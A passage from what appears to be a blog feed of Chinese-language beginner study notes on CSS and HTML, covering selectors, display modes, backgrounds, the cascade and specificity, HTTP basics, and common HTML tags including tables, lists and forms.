<li>为确保生效，请按照LVHA的顺序声明:link-:visited-:hover-:active</li>
<li>记忆法：love hate 或者 lv 宝宝 hao</li>
<li>因为a链接在浏览器中具有默认样式，所以我们实际工作中都需要给链接单独指定样式</li>
</ul>
<h5 id="开发写法">开发写法</h5>
<pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">a</span> <span class="token punctuation">&#123;</span>
	<span class="token property">color</span><span class="token punctuation">:</span> gray<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>
<h4 id="focus伪类选择器">focus伪类选择器</h4>
<p>focus伪类选择器用于选取获得焦点的表单元素</p>
<pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">焦点就是光标，一般情况&lt;input>类表单元素才能获取，因此这个选择器也主要针对表单元素来说
input:focus</span> <span class="token punctuation">&#123;</span>
	<span class="token property">background-color</span><span class="token punctuation">:</span> yellow<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>
<h4 id="复合选择器总结">复合选择器总结</h4>
<table>
<thead>
<tr>
<th>选择器</th>
<th>作用</th>
<th>特征</th>
<th>使用情况</th>
<th>隔开符号及用法</th>
</tr>
</thead>
<tbody>
<tr>
<td>后代选择器</td>
<td>选择后代元素</td>
<td>子孙后代</td>
<td>较多</td>
<td>符号是空格 .nav a</td>
</tr>
<tr>
<td>子代选择器</td>
<td>选择最近一级元素</td>
<td>亲儿子</td>
<td>较少</td>
<td>符号是大于 .nav&gt;p</td>
</tr>
<tr>
<td>并集选择器</td>
<td>选择相同样式的元素</td>
<td>集体声明</td>
<td>较多</td>
<td>符号是逗号 .nav,.header</td>
</tr>
<tr>
<td>链接伪类选择器</td>
<td>选择不同状态的链接</td>
<td>和链接相关</td>
<td>较多</td>
<td>重点记住a{}和a:hover</td>
</tr>
<tr>
<td>focus选择器</td>
<td>选择获得光标的表单</td>
<td>和表单相关</td>
<td>较少</td>
<td>记住input:focus</td>
</tr>
</tbody>
</table>
<h3 id="CSS的元素显示模式">CSS的元素显示模式</h3>
<p>元素显示模式就是元素（标签）以什么方式进行显示，了解他们的特点可以更好的布局我们的网页。比如&lt;div自己占一行，一行可以放多个&lt;span。HTML元素一般分为<strong>块元素</strong>和<strong>行内元素</strong>两种类型</p>
<h4 id="块元素">块元素</h4>
<p>常见的块元素有&lt;h1-6、&lt;p、&lt;div、&lt;ul等，其中div最典型</p>
<p>块级元素的特点：</p>
<ol>
<li>比较霸道，自己独占一行</li>
<li>高度，宽度，外边距以及内边距都可以控制</li>
<li>宽度默认是容器（父级宽度）的100%</li>
<li>是一个容器及盒子，里面可以放行内或者块级元素</li>
</ol>
<p>⚠<font color=pink>注意：</font></p>
<ul>
<li>文字类的元素内不能使用块级元素</li>
<li>&lt;p标签主要用于存放文字，因此&lt;p里面不能放块级元素，特别是&lt;div</li>
<li>同理，&lt;h1-6等都是文字类块级标签，里面也不能放其他块级元素</li>
</ul>
<h4 id="行内元素">行内元素</h4>
<p>常见的行内元素有&lt;a、&lt;strong、&lt;b、&lt;em、&lt;i、&lt;del、&lt;span等，其中&lt;span标签是最典型的行内元素。有的地方也将行内元素成为内联元素。</p>
<p>行内元素的特点：</p>
<p>相邻行内元素在一行上，有一行可以显示多个</p>
<p>高、宽直接设置是无效的</p>
<p>默认的宽度就是它本身的宽度</p>
<p>行内元素只能容纳文本或其他行内元素</p>
<p>注意：</p>
<ul>
<li>
<p>链接里面不能在放链接</p>
</li>
<li>
<p>特殊情况链接&lt;a里面可以放块级元素，但是给&lt;a转换一下块级模式最安全</p>
</li>
</ul>
<h4 id="行内块元素">行内块元素</h4>
<p>在行内元素中有几个特殊的标签——&lt;img &lt;input &lt;td，他们同时具有块元素和行内元素的特点。有些资料称他们为行内块元素。</p>
<p>行内块元素的特点：</p>
<ul>
<li>和相邻行内元素（行内块）在一行上，但是他们之间会有空白间隙，一行可以显示多个（行内元素特点）</li>
<li>默认宽度就是它本身内容的宽度（行内元素特点）</li>
<li>高度，行高，外边距以及内边距都可以控制（块级元素特点</li>
</ul>
<table>
<thead>
<tr>
<th>元素模式</th>
<th>元素排列</th>
<th>设置样式</th>
<th>默认宽度</th>
<th>包含</th>
</tr>
</thead>
<tbody>
<tr>
<td>块级元素</td>
<td>一行只能放一个块级元素</td>
<td>可以设置宽度高度</td>
<td>容器的100%</td>
<td>容器可以包含任何标签</td>
</tr>
<tr>
<td>行内元素</td>
<td>一行可以放多个行内元素</td>
<td>不可以设置宽高</td>
<td>本身内容宽度</td>
<td>容器文本或其他行内元素</td>
</tr>
<tr>
<td>行内块元素</td>
<td>一行放多个行内块元素</td>
<td>可以设置宽高</td>
<td>本身内容宽度</td>
<td></td>
</tr>
</tbody>
</table>
<h4 id="元素显示模式转换">元素显示模式转换</h4>
<p>特殊情况下，我们需要元素模式的转换，简单理解：一个模式的元素需要另一种元素的特性，比如想要增加链接&lt;a的触发范围</p>
<ul>
<li>display: block;</li>
<li>display: inline;</li>
<li>display: inline-block;</li>
</ul>
<h4 id="一个小工具的使用-snipaste">一个小工具的使用 snipaste</h4>
<ul>
<li>F1 截图	F3 悬浮	Alt 查看颜色代码+c复制</li>
</ul>
<h4 id="单行文字垂直居中代码">单行文字垂直居中代码</h4>
<p><em>CSS没有提供，可以通过小技巧实现：<strong>让文字的行高等于盒子的高度</strong></em></p>
<h3 id="CSS的背景">CSS的背景</h3>
<p>通过CSS背景属性，可以给页面元素添加背景样式</p>
<p>背景属性可以设置背景颜色、背景图片、背景平铺、背景图片位置、背景图像固定等</p>
<h4 id="背景颜色">背景颜色</h4>
<p>background-color属性定义了元素的背景颜色</p>
<pre class="language-css" data-language="css"><code class="language-css">background-color：颜色值；</code></pre>
<p>一般情况下元素背景颜色默认值是transparent（透明），也可手动指定</p>
<h4 id="背景图片">背景图片</h4>
<p>background-image属性描述了元素的背景图像。实际开发常见于logo或者一些装饰性的小图片或者是超大的背景图片，优点是非常便于控制位置（精灵图也是一种运用场景）</p>
<pre class="language-css" data-language="css"><code class="language-css"><span class="token property">background-image</span> <span class="token punctuation">:</span> none | <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span></span></code></pre>
<table>
<thead>
<tr>
<th>参数</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>none</td>
<td>无背景图（默认）</td>
</tr>
<tr>
<td>url</td>
<td>使用绝对或相对地址指定背景图像</td>
</tr>
</tbody>
</table>
<h4 id="背景平铺">背景平铺</h4>
<p>如果要在HTML页面上对背景图像进行平铺，可以使用background-repeat属性</p>
<pre class="language-css" data-language="css"><code class="language-css"><span class="token property">background-repeat</span><span class="token punctuation">:</span> repeat | no-repeat | repeat-x | repeat-y</code></pre>
<table>
<thead>
<tr>
<th>参数值</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>repeat</td>
<td>背景图像在纵向和横向上平铺（默认的）</td>
</tr>
<tr>
<td>no-repeat</td>
<td>背景图像不平铺</td>
</tr>
<tr>
<td>repeat-x</td>
<td>背景图像在横向上平铺</td>
</tr>
<tr>
<td>repeat-y</td>
<td>背景图像在纵向上平铺</td>
</tr>
</tbody>
</table>
<h4 id="背景图片位置">背景图片位置</h4>
<p>利用background-position属性可以改变图片在背景中的位置</p>
<pre class="language-css" data-language="css"><code class="language-css"><span class="token property">background-position</span><span class="token punctuation">:</span> x y<span class="token punctuation">;</span></code></pre>
<p>参数代表的意思是：x坐标和y坐标。可以使用<strong>方位名词</strong>或者<strong>精确单位</strong></p>
<table>
<thead>
<tr>
<th>参数值</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>length</td>
<td>百分数 | 由浮点数字和单位标识符组成的长度值</td>
</tr>
<tr>
<td>position</td>
<td>top | center | bottom | left | center | right 方位名词</td>
</tr>
</tbody>
</table>
<p>1.参数是方位名词</p>
<ul>
<li>如果两个值都是方位名词，则两个值得前后顺序无关</li>
<li>如果只指定一个方位名词，另一个值省略，则第二个值默认居中对齐</li>
</ul>
<p>2.参数是精确单位</p>
<ul>
<li>如果参数值是精确坐标，那么第一个肯定是x坐标，第二个一定是y坐标</li>
<li>如果只指定一个数值，那该数值一定是x坐标，另一个默认垂直居中</li>
</ul>
<p>3.参数是混合单位</p>
<ul>
<li>如果指定得两个值是精确单位和方位名词混合使用（x，y顺序不能变）</li>
</ul>
<h4 id="背景图像固定（背景附着）">背景图像固定（背景附着）</h4>
<p>background-attachment属性设置背景图像是否固定或者随着页面得其余部分滚动</p>
<p>background-attachment后期可以制作视差滚动效果</p>
<pre class="language-css" data-language="css"><code class="language-css"><span class="token property">background-attachment</span> <span class="token punctuation">:</span> scroll | fixed</code></pre>
<table>
<thead>
<tr>
<th>参数</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>scroll</td>
<td>背景图像随着对象内容滚动</td>
</tr>
<tr>
<td>fixed</td>
<td>背景图像固定</td>
</tr>
</tbody>
</table>
<h4 id="背景复合写法">背景复合写法</h4>
<p>为了简化背景属性的代码，我们可以将这些属性合并简写在同一个属性background中，从而减少代码量。当使用简写属性时，没有一定的书写顺序，一般习惯约定顺序为：</p>
<p>background：背景颜色 背景图片地址 背景平铺 背景图像滚动 背景图片位置</p>
<pre class="language-css" data-language="css"><code class="language-css"><span class="token property">background</span><span class="token punctuation">:</span> transparent <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>image.jpg<span class="token punctuation">)</span></span> repeat-y fixed top<span class="token punctuation">;</span></code></pre>
<p>实际开发中，我们更提倡的写法</p>
<h4 id="背景颜色半透明">背景颜色半透明</h4>
<p>CSS3为我们提供了半透明的效果</p>
<pre class="language-css" data-language="css"><code class="language-css"><span class="token property">background</span><span class="token punctuation">:</span> <span class="token function">rgba</span><span class="token punctuation">(</span>0<span class="token punctuation">,</span> 0<span class="token punctuation">,</span> 0<span class="token punctuation">,</span> 0.3<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<ul>
<li>红绿蓝 alpha不透明度，取值范围0~1</li>
<li>实际开发中，习惯a的0.3的0省略，写为.3</li>
<li>注意：背景半透明是指盒子背景半透明，盒子里面的内容不受影响</li>
<li>CSS3新增属性，时IE9+版本浏览器才支持的</li>
<li>但是现在实际开发，我们不太关注兼容性写法了，可以放心使用</li>
</ul>
<h4 id="背景总结">背景总结</h4>
<table>
<thead>
<tr>
<th>属性</th>
<th>作用</th>
<th>值</th>
</tr>
</thead>
<tbody>
<tr>
<td>background-color</td>
<td>背景颜色</td>
<td>预定义的颜色值/十六进制/RGB代码</td>
</tr>
<tr>
<td>background-image</td>
<td>背景图片</td>
<td>url（图片路径）</td>
</tr>
<tr>
<td>background-repeat</td>
<td>是否平铺</td>
<td>repeat/no-repeat/repeat-x/repeat-y</td>
</tr>
<tr>
<td>background-position</td>
<td>背景位置</td>
<td>length/position 分别是x，y</td>
</tr>
<tr>
<td>background-attachment</td>
<td>背景附着</td>
<td>scroll（背景滚动）、fixed（背景固定）</td>
</tr>
<tr>
<td>背景简写</td>
<td>书写更简单</td>
<td>背景颜色 背景图片地址 背景平铺 背景滚动 背景位置</td>
</tr>
<tr>
<td>背景色半透明</td>
<td>背景颜色半透明</td>
<td>background: rgba(0,0,0,0.3);后面必须四个值</td>
</tr>
</tbody>
</table>
<p>背景图片：实际开发常见于logo或者一些装饰性的小图片或者是超大的背景图片，优点是非常便于控制位置。（精灵图也是一种运用场景）</p>
<h3 id="CSS三大特性">CSS三大特性</h3>
<p>CSS中有三个非常重要的特性：层叠性、继承性、优先级</p>
<h4 id="层叠性">层叠性</h4>
<p>相同选择器给设置相同的样式，此时一个样式就会覆盖另一个冲突的样式。</p>
<p>层叠性原则：</p>
<ul>
<li>样式冲突，遵循原则是就近原则，哪个样式结构近，就执行哪个样式</li>
<li>样式不冲突，不会层叠</li>
</ul>
<h4 id="继承性">继承性</h4>
<p>CSS中的继承：子标签会继承父标签的某些样式，比如文本的颜色和字号</p>
<ul>
<li>恰当使用继承可以简化代码，降低CSS样式的复杂性</li>
<li>子元素可以继承父元素的样式（text、size、line这些元素开头的可以继承，以及color属性）</li>
<li>继承性口诀：龙生龙，凤生凤，老鼠的孩子会打洞</li>
</ul>
<h5 id="行高的继承性">行高的继承性</h5>
<h4 id="优先级">优先级</h4>
<p>当同一个元素指定多个选择器，就会有优先级</p>
<table>
<thead>
<tr>
<th>选择器</th>
<th>选择器权重</th>
</tr>
</thead>
<tbody>
<tr>
<td>继承或者*</td>
<td>0，0，0，0</td>
</tr>
<tr>
<td>元素选择器</td>
<td>0，0，0，1</td>
</tr>
<tr>
<td>类选择器，伪类选择器</td>
<td>0，0，1，0</td>
</tr>
<tr>
<td>ID选择器</td>
<td>0，1，0，0</td>
</tr>
<tr>
<td>行内样式</td>
<td>1，0，0，0</td>
</tr>
<tr>
<td>!important</td>
<td>∞</td>
</tr>
</tbody>
</table>
<p><strong>优先级注意点</strong></p>
<p>权重是由4组数字组成，但是不会有进位</p>
<p>类选择器永远大于元素选择器，id选择器永远大于类选择器，以此类推</p>
<p>等级判断从左到右，如果某一位数位相同，则判断下一位数值</p>
<p>通配符和继承权重为0</p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title>HTML</title>
    <url>/web/HTML/</url>
    <content><![CDATA[<h4 id="HTTP知识点">HTTP知识点</h4>
<ul>
<li>URI（Uniform Resource Identifier）即统一资源标识符</li>
<li>URL（Universal Resource Locator）即统一资源定位符</li>
</ul>
<p>例如：<a href="https://github.com/favicon.ico%E6%97%A2%E6%98%AF%E4%B8%80%E4%B8%AAURL%EF%BC%8C%E4%B9%9F%E6%98%AF%E4%B8%80%E4%B8%AAURI">https://github.com/favicon.ico既是一个URL，也是一个URI</a></p>
<p>每一个URL都是URI，但不是每一个URI都是URL，URI还包括一个子类叫做URN（Universal Resource Name）即统一资源名称：只命名资源而不指定如何定位资源</p>
<h4 id="HTTP和HTTPS">HTTP和HTTPS</h4>
<p>URL开头会有HTTP或HTTPS，这个就是访问资源需要的协议类型，有时还会看到ftp、sftp、smb开头的URL，他们均是协议类型。HTTP（Hyper Text Transfer Protocol）中文名叫做超文本传输协议，用于从网络传输超文本数据到本地浏览器的传送协议，能保证高效而准确地传送超文本文档。HTTPS（Hyper Text Transfer Protocol over Secure Socket Layer）：是以安全为目标的HPTTP通道，简单讲是HTTP的安全版，即HTTP下加入SSL层。Google以及iOS App在2017年1月1日均对HTTPS做出相关规定，HTTPS已经是大势所趋。</p>
<h4 id="网络请求">网络请求</h4>
<p>请求可分为四部分内容：请求方法、请求头、请求网址、请求体</p>
<p>常见请求有：GET、POST</p>
<p>GET：直接输入网址</p>
<p>POST：大多提交表单时，例如登录</p>
<p>GET请求参数包含在URL里，POST都是通过表单形式传输数据，会包含在请求体里,GET提交数据最多只有1024字节，POST无限制（保护密码、文件较大）</p>
<p>请求头用来说明服务器要使用的附加信息，有User-Agent、Cookies、Referer等</p>
<p>常见服务器请求状态码：</p>
<ul>
<li>200-请求成功</li>
<li>301-资源（网页等）被永久转移到其他URL</li>
<li>404-请求的资源（网页等）不存在</li>
<li>500-服务器内部错误</li>
</ul>
<h4 id="HTML-Web-浏览器简介">HTML-Web-浏览器简介</h4>
<ul>
<li>HTML不是编程语言，而是一种标记语言</li>
<li>超文本：可以加入图片，声音，动画，可以一个文件跳到另一个文件</li>
<li>常用浏览器：IE、火狐（Firefox）、谷歌（Chrome）、Safari、Opera</li>
<li>浏览器内核人（渲染引擎）：读取网页内容，计算网页的显示方式并显示页面</li>
</ul>
<p><strong>Web标准是由W3C（万维网联盟）组织和其他标准化组织指定的一系列标准的集合</strong></p>
<p><em>浏览器不同，显示页面或者排版就有些许差异，主要包括：结构（HTML）、表现（CSS）、行为（Javascript）————最佳体验方案：三者相分离</em></p>
<h4 id="HTML标签">HTML标签</h4>
<h5 id="HTML语法规范">HTML语法规范</h5>
<pre class="language-markup" data-language="markup"><code class="language-markup">标签成对：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>

单标签：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>

双标签关系：包含关系，并列关系</code></pre>
<h5 id="HTML基本机构标签">HTML基本机构标签</h5>
<table>
<thead>
<tr>
<th>标签名</th>
<th>定义</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>html</td>
<td>HTML标签</td>
<td>页面中最大的标签，我们称为根标签</td>
</tr>
<tr>
<td>head</td>
<td>文档的头部</td>
<td>注意在head标签中我们要设置的标题是title</td>
</tr>
<tr>
<td>title</td>
<td>文档的标题</td>
<td>让页面拥有一个属于自己的网页标题</td>
</tr>
<tr>
<td>body</td>
<td>文档的主体</td>
<td>元素包含文档的所有内容</td>
</tr>
</tbody>
</table>
<p>VS-Code之！主体结构</p>
<pre class="language-markup" data-language="markup"><code class="language-markup">&lt;<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>IE=edge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>我的第一个网页<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
	Hello World!
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>
<h5 id="！DOCTYPE">！DOCTYPE</h5>
<p>文档类型声明，告诉浏览器哪种HTML版本来显示网页HTML5（必须第一行）</p>
<h5 id="lang语言">lang语言</h5>
<p>language的缩写：en英语、zh-CH中文</p>
<h5 id="charset字符集">charset字符集</h5>
<p>编码方式：GBK、UTF-8（万国码）一定要写</p>
<h5 id="HTML常用标签">HTML常用标签</h5>
<ul>
<li>语义标签，区分标题，段落等</li>
<li>标题标签h，一行显示</li>
<li>段落和换行标签p，强制换行br</li>
</ul>
<p>文本格式化标签：</p>
<table>
<thead>
<tr>
<th>语义</th>
<th>标签</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>加粗</td>
<td>strong或者b</td>
<td>推荐strong，语气更强烈</td>
</tr>
<tr>
<td>倾斜</td>
<td>em或者i</td>
<td>推荐em，语气更强烈</td>
</tr>
<tr>
<td>删除线</td>
<td>del或者s</td>
<td>推荐del，语气更强烈</td>
</tr>
<tr>
<td>下划线</td>
<td>ins或者u</td>
<td>推荐ins，语气更强烈</td>
</tr>
</tbody>
</table>
<p>标签div和span没有语义，只是一个盒子，用来装内容的。div是一个超大盒子，一行只能一个div。而span是个小盒子，一行可以多个。</p>
<h5 id="img图片">img图片</h5>
<pre class="language-markup" data-language="markup"><code class="language-markup">在HTML标签中，<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></code></pre>
<table>
<thead>
<tr>
<th>属性</th>
<th>属性值</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>src</td>
<td>图片路径</td>
<td>必须属性</td>
</tr>
<tr>
<td>alt</td>
<td>文本</td>
<td>替换文本。图像不能显示的文字</td>
</tr>
<tr>
<td>title</td>
<td>文本</td>
<td>提示文本。鼠标放到图像上显示的文字</td>
</tr>
<tr>
<td>width</td>
<td>像素</td>
<td>设置图像的宽度</td>
</tr>
<tr>
<td>height</td>
<td>像素</td>
<td>设置图像的高度</td>
</tr>
<tr>
<td>border</td>
<td>像素</td>
<td>设置图像的边框粗细</td>
</tr>
</tbody>
</table>
<p>border在HTML5已不支持（bordeR）</p>
<p>属性均采取键值对的形式：key= “value”</p>
<h5 id="超链接标签">超链接标签</h5>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>跳转目标<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>目标窗口的弹出方式<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> 文本或图像 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></code></pre>
<ul>
<li>弹出方式：_self：在该窗口打开、__blank：新窗口打开页面</li>
<li>跳转目标：#表示空链接</li>
<li>锚点链接：设置href属性名为**#名字**的形式、id属性=刚刚的名字</li>
</ul>
<h5 id="注释标签：-–我是一个注释–">注释标签：!–我是一个注释–</h5>
<p><img src="https://i.loli.net/2021/08/30/ItLNCf48Szg1UOD.png" alt=""></p>
<h5 id="表格标签">表格标签</h5>
<p>用于展示数据（不是来布局页面的）</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span><span class="token punctuation">></span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>文字<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span>
# <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span><span class="token punctuation">></span></span>定义表格
# <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>用于定义单元格中的行，必须嵌套在<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span><span class="token punctuation">></span></span>中
# <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>用于定义表格中的单元格，必须嵌套在<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>中</code></pre>
<p>表格属性，实际开发不常用，后面通过CSS来设置</p>
<table>
<thead>
<tr>
<th>属性名</th>
<th>属性值</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>align</td>
<td>left、center、right</td>
<td>规定表格相对周围元素的对齐方式</td>
</tr>
<tr>
<td>border</td>
<td>1或 “”</td>
<td>规定表格单元是否拥有边框，默认为&quot;&quot;,表示没有边框</td>
</tr>
<tr>
<td>cellpadding</td>
<td>像素值</td>
<td>规定单元边沿与其内容之间的空白，默认1像素</td>
</tr>
<tr>
<td>cellspacing</td>
<td>像素值</td>
<td>规定单元格之间的空白，默认2像素</td>
</tr>
<tr>
<td>width</td>
<td>像素值或百分比</td>
<td>规定表格的宽度</td>
</tr>
</tbody>
</table>
<p>表格结构标签</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>thead</span><span class="token punctuation">></span></span>表格的头部区域<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tbody</span><span class="token punctuation">></span></span>表格的整体区域</code></pre>
<p>合并单元格</p>
<ul>
<li>跨行合并：rowspan=“合并单元格的个数”</li>
<li>跨列合并：colspan=“合并单元格的个数”</li>
</ul>
<h5 id="列表标签">列表标签</h5>
<p>列表可以分为三大类：无序列表、有序列表、自定义列表</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"># 主标签只能嵌套<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>，其中可以容纳所有元素
# 无序列表（重点）、排序整齐，没有顺序
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
	....
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>
# 有序列表（不常用，了解即可）
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ol</span><span class="token punctuation">></span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
	....
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ol</span><span class="token punctuation">></span></span>
# 自定义列表、一个小标题，其他围绕他们说明
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dl</span><span class="token punctuation">></span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dt</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dt</span><span class="token punctuation">></span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dd</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dd</span><span class="token punctuation">></span></span>
	....
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dd</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dd</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dl</span><span class="token punctuation">></span></span></code></pre>
<h5 id="表单标签">表单标签</h5>
<p>目的：收集用户信息</p>
<p>一个完整的表单由<strong>表单域、表单控件（表单元素）<strong>和</strong>提示信息</strong>三部分组成</p>
<p>表单域：包含表单元素的区域</p>
<p>在HTML中，form标签用于定义表单域，以实现用户信息的收集与传递，递交到服务器</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>url地址<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>提交方式<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>表单域名称<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
	# 各种表单元素控件
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre>
<p>表单元素</p>
<ul>
<li>input输入表单元素</li>
</ul>
<pre class="language-markup" data-language="markup"><code class="language-markup"># 用于收集用户信息。<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>属性值<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>。
